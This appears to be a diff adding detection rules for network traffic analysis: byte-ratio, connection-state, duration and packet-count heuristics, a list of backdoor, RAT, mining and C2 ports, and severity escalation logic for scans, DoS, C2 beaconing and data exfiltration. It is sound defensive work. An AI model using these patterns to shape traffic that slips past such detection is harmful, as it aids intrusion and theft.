+Severity: HIGH
+
+
+================================================================================
+ GLOBAL DETECTION RULES — NETWORK TRAFFIC ANALYSIS
+================================================================================
+
+BYTE RATIO ANALYSIS:
+  - src_bytes >> dst_bytes (ratio > 10:1): likely DoS/DDoS or data exfiltration
+  - dst_bytes >> src_bytes (ratio > 10:1): likely data download or amplification
+  - Both near zero: likely scan or probe (conn_state=S0)
+  - Both substantial and equal: likely interactive session (backdoor, SSH, RDP)
+
+CONNECTION STATE ANALYSIS:
+  - conn_state=S0 in volume: SYN scan, DoS SYN flood
+  - conn_state=REJ in volume: port scan showing closed ports
+  - conn_state=SF + long duration + low bytes: backdoor/C2 idle channel
+  - conn_state=RSTO: connection reset (possible IDS evasion or exploit crash)
+
+DURATION ANALYSIS:
+  - duration ≈ 0 + low bytes: scan, probe, or failed connection
+  - duration > 300s + low bytes: backdoor, C2 beaconing, idle tunnel
+  - duration > 300s + high bytes: data exfiltration or streaming
+
+PACKET COUNT ANALYSIS:
+  - src_pkts >> dst_pkts: flooding attack (DoS/DDoS)
+  - src_pkts = 1, dst_pkts = 0: SYN scan
+  - src_pkts = dst_pkts (±10%): balanced interactive session
+
+PORT RISK CLASSIFICATION:
+  HIGH RISK: 4444, 1337, 31337, 12345, 6667 (common backdoor/RAT ports)
+  ADMIN/MANAGEMENT: 22 (SSH), 3389 (RDP), 5900 (VNC), 23 (Telnet)
+  DATABASE: 3306 (MySQL), 5432 (PostgreSQL), 27017 (MongoDB), 6379 (Redis)
+  MINING: 3333, 4444, 8888, 14444 (cryptocurrency mining)
+  C2/BOTNET: 6667, 6697 (IRC), 1080 (SOCKS proxy)
+
+SEVERITY DECISION LOGIC:
+  CRITICAL: Active exploitation, backdoor, ransomware, C2, data exfiltration
+  HIGH:     Successful brute force, injection, privilege escalation, DoS
+  MEDIUM:   Reconnaissance, suspicious patterns, failed attack attempts
+  LOW:      Single anomalous packet, minor deviation from baseline
+
+MULTI-INDICATOR ESCALATION:
+  If multiple indicators from different categories are present simultaneously,
+  escalate severity by one level. Example: port scan (MEDIUM) + subsequent
+  backdoor connection to discovered port = CRITICAL attack chain.
+
+================================================================================
+END OF KNOWLEDGE BASE
+================================================================================
